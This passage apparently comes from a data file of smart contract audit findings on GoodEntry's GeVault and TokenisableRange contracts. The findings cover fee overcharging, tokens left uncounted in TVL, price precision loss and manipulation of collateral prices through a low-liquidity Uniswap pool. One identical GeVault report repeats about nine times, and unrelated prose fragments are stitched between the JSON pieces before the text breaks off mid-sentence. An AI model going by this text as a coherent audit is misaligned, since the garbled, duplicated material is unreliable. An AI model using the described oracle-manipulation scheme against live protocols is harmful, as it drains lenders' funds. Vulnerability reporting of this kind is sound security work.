However, if price moves outside the range during the transaction, user will be charged an excessive fee.\n\n## Proof of Concept\n    if ( fee0+fee1 > 0 && ( n0 > 0 || fee0 == 0) && ( n1 > 0 || fee1 == 0 ) ){\n      address pool = V3_FACTORY.getPool(address(TOKEN0.token), address(TOKEN1.token), feeTier * 100);\n      (uint160 sqrtPriceX96,,,,,,)  = IUniswapV3Pool(pool).slot0();\n      (uint256 token0Amount, uint256 token1Amount) = LiquidityAmounts.getAmountsForLiquidity( sqrtPriceX96, TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);\n      if (token0Amount + fee0 > 0) newFee0 = n0 * fee0 / (token0Amount + fee0);\n      if (token1Amount + fee1 > 0) newFee1 = n1 * fee1 / (token1Amount + fee1);\n      fee0 += newFee0;\n      fee1 += newFee1; \n      n0   -= newFee0;\n      n1   -= newFee1;\n    }\n\nSuppose range is [120, 122] and current price is 121. Alice calls `deposit` with `{n0: 100, n1:100} `, if Price moves to 119 during execution (due to market fluctuations or malicious frontrunning), `getAmountsForLiquidity` will return 0 for `token1Amount`. As a result, `newFee1` will be equal to `n1`, which means all the 100 token1 will be charged as fee.\n\n    (uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n      INonfungiblePositionManager.IncreaseLiquidityParams({\n        tokenId: tokenId,\n        amount0Desired: n0,\n        amount1Desired: n1,\n        amount0Min: n0 * 95 / 100,\n        amount1Min: n1 * 95 / 100,\n        deadline: block.timestamp\n      })\n    );\n\nThen, `increaseLiquidity` will succeed since `amount1Min` is now zero.\n\n## Tools Used\nManual\n\n## Recommended Mitigation Steps\nDon't use this to calculate fee:\n\n    if ( fee0+fee1 > 0 && ( n0 > 0 || fee0 == 0) && ( n1 > 0 || fee1 == 0 ) ){\n      address pool = V3_FACTORY.getPool(address(TOKEN0.token), address(TOKEN1.token), feeTier * 100);\n      (uint160 sqrtPriceX96,,,,,,)  = IUniswapV3Pool(pool).slot0();\n      (uint256 token0Amount, uint256 token1Amount) = LiquidityAmounts.getAmountsForLiquidity( sqrtPriceX96, TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);\n      if (token0Amount + fee0 > 0) newFee0 = n0 * fee0 / (token0Amount + fee0);\n      if (token1Amount + fee1 > 0) newFee1 = n1 * fee1 / (token1Amount + fee1);\n      fee0 += newFee0;\n      fee1 += newFee1; \n      n0   -= newFee0;\n      n1   -= newFee1;\n    }\n\nAlways use this:\n\n      uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));\n      uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));\n      require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, \"Invalid Oracle Price\");\n      // Calculate the equivalent liquidity amount of the non-yet compounded fees\n      // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity \n      feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )   \n                                    / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) ); \n\n\n## Assessed type\n\nContext"

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

This can happen when the price of `token1` is very high compared to `token0`, after normalizing for decimals. The resulting zero value for `sqrtPriceX96` passed to `getAmountsForLiquidity` can lead to an incorrect assumption that the liquidity consists only of `amount0`, ignoring any `amount1` present. Since the price impact is derived from the token ratios, the severe undervaluation can trigger unnecessary and incorrect liquidations. The division operation prior to the multiplication with `2**96` is the problematic part as it truncates the result to zero if `token1Price` is significantly higher than `token0Price`. The division operation should be conducted post-multiplication to minimize the loss of precision in the output. The described mitigation step to modify the order of operations to multiply by `2**96` before the division operation should allow the contract to handle a wider range of price ratios without precision loss. In conclusion, the contract exhibits vulnerabilities where arithmetic precision issues lead to the potential for incorrect price computations. This can have serious consequences for users who could face improper liquidation.

This can be done by creating a low liquidity pool with a distorted ratio of assets, which misrepresents the true market value.

Even though the `returnExpectedBalanceWithoutFees` function is not directly linked to the vulnerability, if it or similar functions that rely on oracle prices are used to determine collateral values, they are part of the overarching logic that allows for this exploitation.

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

                    "description": "The vulnerability stems from the fact that the `getTokenPrice` function values a Uniswap V3 position by simply adding together the value of the ERC20 tokens in it, using the current exchange rate from an oracle without considering the liquidity depth of the pool from which the price is being sourced. An attacker can exploit low liquidity pools to manipulate the feed price.\n\nIn the proof of concept presented, Alice creates a WETH/DAI pool in Uniswap V3 with a very low amount of DAI relative to WETH. This new pool will have extremely low total value locked (TVL), which means the price can be significantly impacted by small trades. Despite the low liquidity, the price from this pool is used by Paraspace to assess the value of the collateral position. After her liquidity is used as collateral, Alice swaps WETH for DAI in her own pool, causing the value of the remaining WETH in the position to plummet.\n\nThis strategy allows Alice to borrow a high amount of USDC against the Uniswap V3 position when it is valued at approximately the price of 1 WETH, but the actual value after her manipulation is closer to 1 DAI, leaving Paraspace with collateral that is worth much less than the amount borrowed.\n\nThe vulnerability can be classified as an economic/financial manipulation because the attacker directly manipulates the financial parameters of a protocol (here, the price) to gain an unfair advantage. This can result in a significant financial loss to the Paraspace pool due to undercollateralized loans.\n\nThe `getTVL` function provided is not directly related to the vulnerability described in the token pricing function `getTokenPrice`. However, it can be hypothesized from the name that `getTVL` sums the value of all \"ticks,\" which may serve as ranges of liquidity within Uniswap V3 or another context. The risk would then correspond to similar issues where the liquidity of each tick (range) is not considered, which could compound the larger protocol's vulnerability to manipulation if used in collateral valuation.\n\nThe recommended mitigation strategy involves using whitelists that only allow positions from Uniswap V3 pools with significant TVL as collateral. This would help prevent the manipulation of thin (low liquidity) markets to influence the paraspace collateral system.",

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

The contract state variable indicates whether it is in a rebalancing state, and deposit and withdrawal functions check this state, preventing operations if the contract is 'locked'.\n\nAfter applying the patch, it is concluded that the smart contract is no longer vulnerable to the described front-running issue. However, the evaluation is based on the assumption that there are no other contract functions or external interactions that could undermine the proposed locking mechanism. A full audit would be necessary to ensure the patch's effectiveness in all possible scenarios.",

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. 